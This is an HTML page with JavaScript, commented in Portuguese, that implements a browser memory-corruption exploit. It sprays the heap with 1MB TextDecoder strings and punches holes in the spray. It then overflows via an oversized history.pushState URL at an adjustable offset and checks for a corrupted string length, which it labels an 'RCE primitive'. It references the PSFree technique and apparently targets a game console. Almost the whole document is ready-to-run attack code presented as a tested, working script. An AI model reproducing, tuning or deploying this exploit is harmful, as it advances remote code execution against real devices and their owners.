<!DOCTYPE html>
<html>
<head>
    <title>1MB Decoder Clash (Reference). hhhhh</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-top: 20px;
        }
        input { font-size: 30px; background: #222; color: #fff; border: 2px solid #0f0; text-align: center; padding: 10px; width: 300px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .hit { color: yellow; font-weight: bold; border: 1px solid yellow; padding: 5px; }
    </style>
</head>
<body>

    <h1>1MB Decoder Clash (Referência)</h1>
    <p>Script original que obteve sucesso. Use a caixa abaixo para ajustar o offset manualmente.</p>

    <div style="text-align:center">
        OFFSET DO TIRO:<br>
        <input type="number" id="offsetInput" value="709520">
    </div>

    <button onclick="startDecoderAttack()">INICIAR (1MB)</button>
    
    <div id="log">Pronto. Reinicie o console antes de cada tentativa.</div>

    <script>
        const OVERFLOW_AMT = 1024 * 64; 

        // CONFIGURAÇÃO 100% ORIGINAL (1MB TextDecoder)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startDecoderAttack() {
            // Pega o valor da caixa (Original: 709520)
            let currentOffset = parseInt(document.getElementById('offsetInput').value);

            log(`----------------------------------------`);
            log(`INICIANDO COM OFFSET: ${currentOffset}`);
            log(`Criando vítimas de 1MB (Base Fiel)...`);

            // 1. Limpeza Prévia
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY (Cópia exata do sucesso)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 80; 
                
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Abrindo buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i] = null;
                }

                // Força GC pesado
                await forceGC();

                // 4. EXPLOIT
                log(`Disparando...`);
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(currentOffset);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "pwn", "/" + buffer);

                        log("Verificando...");
                        checkVictims(PAYLOAD_SIZE, currentOffset);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkVictims(expectedLen, off) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                // TRUQUE DO ERROR (Do PSFree)
                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO ABSOLUTO (RCE - LENGTH)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido no Offset ${off}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // SUCESSO PARCIAL (DADOS)
                    if (msg.charCodeAt(0) === 1) { // 1 = 0x01
                        log(`[Sucesso Parcial] DADOS atingidos com ${off}.`, 'hit');
                        log(`Dica: Reinicie e tente baixar o offset para ${off - 8}.`, 'hit');
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log(`Nada atingido com ${off}. Tente reiniciar.`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
